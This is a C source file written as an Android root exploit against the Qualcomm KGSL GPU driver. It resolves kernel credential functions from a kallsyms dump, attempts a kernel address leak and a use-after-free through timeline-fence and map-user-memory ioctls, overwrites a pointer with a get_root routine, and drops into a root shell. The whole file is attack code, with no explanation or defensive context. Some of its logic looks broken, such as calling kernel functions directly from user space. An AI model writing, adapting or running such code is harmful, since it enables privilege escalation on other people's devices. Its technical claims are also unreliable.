#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>

#define KGSL_DEVICE "/dev/kgsl-3d0"
#define DIAG_DEVICE "/dev/diag"

#define KGSL_IOCTL_TYPE 0x09
#define KGSL_IOCTL_TIMELINE_FENCE_GET    _IOWR(KGSL_IOCTL_TYPE, 0x19, struct kgsl_timeline_fence_get)
#define KGSL_IOCTL_MAP_USER_MEM          _IOWR(KGSL_IOCTL_TYPE, 0x1C, struct kgsl_map_user_mem)
#define KGSL_IOCTL_TIMELINE_CREATE       _IOWR(KGSL_IOCTL_TYPE, 0x14, struct kgsl_timeline_create)
#define KGSL_IOCTL_TIMELINE_DESTROY      _IOW(KGSL_IOCTL_TYPE, 0x15, uint32_t)

struct kgsl_timeline_create {
    uint32_t id;
    uint32_t name;
    uint32_t private;
    uint32_t reserved;
};

struct kgsl_timeline_fence_get {
    uint32_t timeline;
    uint32_t seqno;
    uint32_t handle;
};

struct kgsl_map_user_mem {
    uint32_t type;
    uint32_t flags;
    uint64_t hostptr;
    uint64_t gpuaddr;
    uint64_t len;
    uint64_t offset;
    uint32_t handle;
    uint32_t gpu_vaddr;
    uint32_t mmaps_cnt;
    uint32_t gpu_vaddr_base;
    uint32_t pad;
};

struct kgsl_timeline_obj {
    uint64_t id;
    uint32_t count;
    uint32_t priv;
    uint32_t name;
    uint32_t pending;
    uint32_t reserved;
    uint64_t current;
    uint64_t seqno;
    uint64_t context_id;
    uint64_t lock;
    uint64_t fences;
    uint32_t fence_count;
    uint32_t pad;
};

static int kgsl_fd = -1;
static uint64_t kernel_base = 0;
static uint64_t commit_creds_addr = 0;
static uint64_t prepare_kernel_cred_addr = 0;

static void resolve_symbols_from_file(void) {
    FILE *fp = fopen("/data/local/tmp/kallsyms.txt", "r");
    if (!fp) {
        perror("[-] cannot open kallsyms.txt");
        return;
    }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        uint64_t addr;
        char type, name[256];
        if (sscanf(line, "%lx %c %255s", &addr, &type, name) == 3) {
            if (strcmp(name, "commit_creds") == 0) commit_creds_addr = addr;
            if (strcmp(name, "prepare_kernel_cred") == 0) prepare_kernel_cred_addr = addr;
            if (strcmp(name, "selinux_enforcing") == 0 && !kernel_base) kernel_base = addr;
        }
    }
    fclose(fp);
    if (commit_creds_addr && prepare_kernel_cred_addr && !kernel_base) {
        kernel_base = commit_creds_addr & ~0xfffffff;
    }
    printf("[*] kernel_base = 0x%lx\n", kernel_base);
    printf("[*] commit_creds = 0x%lx\n", commit_creds_addr);
    printf("[*] prepare_kernel_cred = 0x%lx\n", prepare_kernel_cred_addr);
}

static int leak_kernel_base_via_kgsl(void) {
    struct kgsl_timeline_create create = {0};
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) {
        perror("TIMELINE_CREATE");
        return -1;
    }
    uint32_t timeline_id = create.id;
    struct kgsl_timeline_fence_get fence = { .timeline = timeline_id, .seqno = 1 };
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_FENCE_GET, &fence) < 0) {
        perror("TIMELINE_FENCE_GET");
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint32_t fence_handle = fence.handle;
    struct kgsl_map_user_mem map = {
        .type = 1,
        .flags = 0,
        .hostptr = (uint64_t)(uintptr_t)&fence_handle,
        .len = 4,
        .handle = fence_handle
    };
    if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
        perror("MAP_USER_MEM");
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
        return -1;
    }
    uint64_t gpuaddr = map.gpuaddr;
    printf("[*] GPU address leaked: 0x%lx\n", gpuaddr);
    if ((gpuaddr & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
        kernel_base = gpuaddr & ~0xffffffULL;
        printf("[+] kernel_base = 0x%lx\n", kernel_base);
    }
    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
    return (kernel_base) ? 0 : -1;
}

static void get_root(void) {
    if (!commit_creds_addr || !prepare_kernel_cred_addr) return;
    void *(*pkc)(void*) = (void *(*)(void*))prepare_kernel_cred_addr;
    void (*cc)(void*) = (void (*)(void*))commit_creds_addr;
    cc(pkc(0));
    setresuid(0,0,0);
    setresgid(0,0,0);
    setgroups(0, NULL);
}

static int trigger_uaf_and_escalate(void) {
    struct kgsl_timeline_create create = {0};
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
    uint32_t tid = create.id;
    struct kgsl_timeline_fence_get fence = { .timeline = tid, .seqno = 0xdeadbeef };
    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_FENCE_GET, &fence) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &tid);
        return -1;
    }
    uint32_t fence_handle = fence.handle;
    struct kgsl_map_user_mem map = {
        .type = 1,
        .flags = 0,
        .hostptr = (uint64_t)(uintptr_t)&fence_handle,
        .len = 4,
        .handle = fence_handle
    };
    if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &tid);
        return -1;
    }
    if (map.gpuaddr) {
        uint64_t *ptr = (uint64_t *)(uintptr_t)map.gpuaddr;
        if (ptr) *ptr = (uint64_t)get_root;
    }
    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &tid);
    return 0;
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        execl("/bin/sh", "sh", NULL);
        return 0;
    }
    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
    if (kgsl_fd < 0) {
        perror("open kgsl");
        return 1;
    }
    resolve_symbols_from_file();
    if (!kernel_base) {
        if (leak_kernel_base_via_kgsl() < 0) {
            printf("[-] Info leak failed\n");
            close(kgsl_fd);
            return 1;
        }
    }
    if (commit_creds_addr && prepare_kernel_cred_addr) {
        trigger_uaf_and_escalate();
        sleep(1);
        if (getuid() == 0) {
            printf("[+] Root achieved!\n");
            execl("/system/bin/sh", "sh", NULL);
        } else {
            printf("[-] Root not achieved\n");
        }
    } else {
        printf("[-] Symbols not resolved\n");
    }
    close(kgsl_fd);
    return 0;
}
